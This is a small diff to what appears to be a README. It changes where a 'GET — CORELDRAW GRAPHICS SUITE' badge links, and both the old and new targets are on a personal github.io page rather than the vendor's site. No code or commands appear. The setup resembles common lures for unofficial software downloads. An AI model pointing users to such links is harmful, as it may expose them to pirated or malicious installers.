@@ -4,7 +4,7 @@
 <img src="https://image.2gosoftware.eu/img/624/624/catalog/Corel/2026/CorelDRAW_Graphic_Suite/cdgs-2026-front.jpg" width="500">
 </p>
 
-[![GET — CORELDRAW GRAPHICS SUITE](https://img.shields.io/badge/GET-CORELDRAW%20GRAPHICS%20SUITE-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — CORELDRAW GRAPHICS SUITE](https://img.shields.io/badge/GET-CORELDRAW%20GRAPHICS%20SUITE-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/CorelDRAW-Graphics)
 
 ---
 
